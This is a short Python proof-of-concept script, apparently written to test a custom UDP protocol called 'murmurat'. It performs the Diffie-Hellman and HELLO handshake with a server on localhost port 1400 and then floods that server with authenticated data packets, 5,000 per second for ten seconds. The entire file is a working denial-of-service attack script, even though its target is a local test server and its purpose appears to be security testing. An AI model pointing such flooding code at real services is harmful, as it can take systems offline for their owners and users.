# dos_flood_poc.py
import socket
import os
import time
from murmurat import build_data_packet, dh_keygen, dh_shared_secret, ksession_from_secret, rsa_keygen, build_hello, parse_hello

UDP_IP   = "127.0.0.1"
UDP_PORT = 1400

def setup_session():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # DH
    priv, pub = dh_keygen()
    sock.sendto(pub.to_bytes(256,"big"), (UDP_IP, UDP_PORT))
    srv_pub = int.from_bytes(sock.recv(4096), "big")
    ksession = ksession_from_secret(dh_shared_secret(srv_pub, priv))
    # HELLO
    pid = os.urandom(4)
    rkey = rsa_keygen()
    sock.sendto(build_hello(pid, rkey), (UDP_IP, UDP_PORT))
    srv_h = sock.recv(1024)
    _, srv_pubkey = parse_hello(srv_h)
    return sock, ksession, rkey, pid

def flood(sock, ksession, rsa_key, pubkey_id, rate=1000, duration=5):
    """
    Stuurt rate pakketten per seconde, gedurende duration seconden.
    """
    payload = b"DoS test flood"
    interval = 1.0 / rate
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = build_data_packet(payload, ksession, rsa_key, pubkey_id)
        sock.sendto(pkt, (UDP_IP, UDP_PORT))
        sent += 1
        time.sleep(interval)
    print(f"[POC] Flood complete: sent {sent} packets in {duration}s")

if __name__ == "__main__":
    sock, ksession, rsa_key, pid = setup_session()
    print("[POC] Session established, starting UDP flood...")
    flood(sock, ksession, rsa_key, pid, rate=5000, duration=10)
